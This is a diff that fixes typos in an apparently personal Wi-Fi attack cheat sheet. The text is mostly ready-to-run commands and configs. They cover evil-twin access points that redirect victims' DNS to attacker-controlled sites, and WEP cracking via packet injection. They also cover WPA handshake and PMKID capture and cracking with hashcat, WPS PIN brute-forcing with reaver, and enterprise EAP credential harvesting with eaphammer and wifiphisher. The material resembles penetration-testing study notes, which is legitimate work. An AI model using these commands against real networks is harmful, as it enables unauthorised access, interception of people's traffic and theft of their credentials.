@@ -281,19 +281,19 @@ Since DNS requests are generally allowed even on networks with captive portals, 
 Try to find a vulnerability in the captive portal itself to bypass the login
 
 #### Evil Twin 
-1. Create a **hostpad** config file 
-```bash copy filename="hostpad.conf" 
+1. Create a **hostapd** config file 
+```bash copy filename="hostapd.conf" 
 interface=wlan0
 ssid=FakeOpenNetwork
 channel=6
 ```
-2. Configure DHCP server with **dnsmask** by modifying `/etc/dnsmasq.conf`
-```text copy filename="dnsmasq.conf"
+2. Configure DHCP server with **dnsmasq** by modifying `/etc/dnsmasq.conf`
+```text copy filename="dnsmasq.conf" showLineNumbers
 interface=wlan0
 dhcp-range=192.168.1.50,192.168.1.150,12h
 ```
 3. We can also configure **dnsmasq** to redirect dns queries of the victims to an actual fake dns server so we can redirect them to fake attacker controlled websites
-```bash copy filename="dnsmask.conf"
+```bash copy filename="dnsmasq.conf"
 address=/example.com/192.168.1.100
 ```
 
@@ -316,13 +316,13 @@ Wired Equivilent Privacy. was the first attempt to encrypt the wifi communicatio
 1. **Fake Authentication**.
 
     Sending fake authentication packets to the AP to collect more IVs
-    ```bash copy fielname="Terminal"
+    ```bash copy filename="Terminal"
     aireplay-ng -1 0 -a <AP MAC> -h <Client MAC> wlan0mon
     ```
 2. **ARP Request Replay Attack (arpreplay)**
 
     Capture valid ARP packets, then repeatedly re-inject them into the network.
-    ```bash copy fielname="Terminal"
+    ```bash copy filename="Terminal"
     aireplay-ng --arpreplay -b <AP MAC> -h <Fake Client MAC> wlan0mon
     ```
 
@@ -347,25 +347,25 @@ Wired Equivilent Privacy. was the first attempt to encrypt the wifi communicatio
 </Tabs>
 
 #### Dumping traffic
-    ```bash copy fielname="Terminal"
+    ```bash copy filename="Terminal"
     airodump-ng -c channel_num -bssid BSSID -w output-file wlan0mon
     ```
 #### Cracking the key through the IVs
-```bash copy fielname="Terminal"
+```bash copy filename="Terminal"
 aircrack-ng capture.cap -b <AP-MAC> 
 ```
 #### Automatic Attack
-```bash copy fielname="Terminal"
+```bash copy filename="Terminal"
 besside-ng -c 3 -b <AP-MAC> wlan0mon -v
 ````
 ### PSK
 1. Deauth attack to force clients to do the handshake again
 2. Capture handshakes
-```bash copy fielname="Terminal"
+```bash copy filename="Terminal"
 sudo airodump-ng wlan0mon -c <channel> -w ~/wifi/capture
 ```
 3. Cracking against a dictionary
-```bash copy fielname="Terminal"
+```bash copy filename="Terminal"
 # Cracking with aircrack-ng
 sudo aircrack-ng -w /path/to/dictionary.txt capture-01.cap
 
@@ -375,7 +375,7 @@ sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force # Cracking with hash
 ```
 #### PMKID vulnerability
 The clientless attack
-```bash copy fielname="Terminal"
+```bash copy filename="Terminal"
 sudo hcxdumptool -i wlan0mon -W capture.pcapng # capture the PMKID 
 aircrack-ng capture.cap # analyze the cap file to check if it has a PMKID or not 
 sudo hcxpcapngtool -o capture.22000 capture.pcapng # convert it to a hashcat format
@@ -383,8 +383,8 @@ sudo hashcat -m 22000 -a 0 capture.22000 /path/to/dictionary.txt # crack
 ```
 #### NoAP
 Also known as half-handshake attack. So if the attack only requires the first 2 messages from the  handshake. and only the second message (sent by the client) is the one needed as its the one encrypted with the key. Why do we need the AP for ? Lets start our own AP based on clients probs
-1. **Prepare hostpad.conf**
-```c showLineNumbers copy fileanme="hostpad.conf"
+1. **Prepare hostapd.conf**
+```c showLineNumbers copy filename="hostapd.conf"
 interface=$INTERFACE
 driver=nl80211
 hw_mode=g
@@ -398,13 +398,13 @@ wpa_passphrase=12345678
 ```
 2. **Start the fake AP**
 ```copy bash filename="Terminal"
-hostpad hostpad.conf
+hostapd hostapd.conf
 ```
 
 3. <a href="#psk">**Dump and Crack**</a> 
 Don't forget to use `airodump-ng` on the bssid of our fake AP
 #### WPS PIN
-```bash copy fielname="Terminal"
+```bash copy filename="Terminal"
 sudo wash -i wlan0mon 
 airodump-ng --wps # Identify networks with WPS enabled
 sudo reaver -i wlan0mon -b <BSSID> -vv # obtain the WPS pin and PSK key
@@ -416,8 +416,8 @@ Will be added
 Fragmentation and Aggregation attacks
 Will be added
 ### Evil Twin Attack
-1. Configure hostpad for fake AP 
-```c showLineNumbers filename="hostpad.conf"
+1. Configure hostapd for fake AP 
+```c showLineNumbers filename="hostapd.conf"
 interface=$INTERFACE
 driver=nl80211
 ssid=$SSID
@@ -430,8 +430,8 @@ wpa_key_mgmt=WPA-PSK
 wpa_pairwise=TKIP
 rsn_pairwise=CCMP
 ```
-2. dnsmask for DHCP and DNS servers
-```c copy fileanem="dnsmask.conf"
+2. dnsmasq for DHCP and DNS servers
+```c copy showLineNumbers filename="dnsmasq.conf"
 interface=$INTERFACE
 dhcp-range=192.168.2.2,192.168.2.100,12h
 dhcp-option=3,192.168.2.1
@@ -440,7 +440,7 @@ server=8.8.8.8
 log-queries
 log-dhcp
 ```
-3. Start  **dnsmask**
+3. Start  **dnsmasq**
 ```bash copy filename="Terminal"
 sudo dnsmasq -C dnsmasq.conf
 ```
@@ -491,7 +491,7 @@ cewl -d 2 -m 5 -w docswords.txt
 ## Wikipedia
 sudo iwlist wlan0 frequency | grep 'Channel 12 :'
 ```
-<Tabs items={['wacker', 'irgeddon']}>
+<Tabs items={['wacker', 'airgeddon']}>
     <Tab>
     ```bash copy filename="Terminal"
         ./wacker.py --wordlist $DICCIONARIO --ssid $ESSID --bssid $BSSID --interface $INTERFACE --freq 2462
@@ -575,7 +575,7 @@ EAP_buster.sh ssid 'DOMAIN\User' wlan1
             python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate weakest
             ```
 <Callout type="info" emoji="👻">
-We can also use `airgeddon` or perform the entire attack manually using `hostpad`
+We can also use `airgeddon` or perform the entire attack manually using `hostapd`
 </Callout>
 ##### Relay Attack
 1. connect to the real AP. and initiate the challenge handshake processes
@@ -651,7 +651,7 @@ wifiphisher -aI wlan0 -p wifi_connect --handshake-capture handshake.pcap
     ```
 
 2. Spawn the fake AP with the stilen CA certificate
-    ```bash copy filename="Terminal
+    ```bash copy filename="Terminal"
     python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp 
     ```
 3. Perform a `deauth` attack against the clients
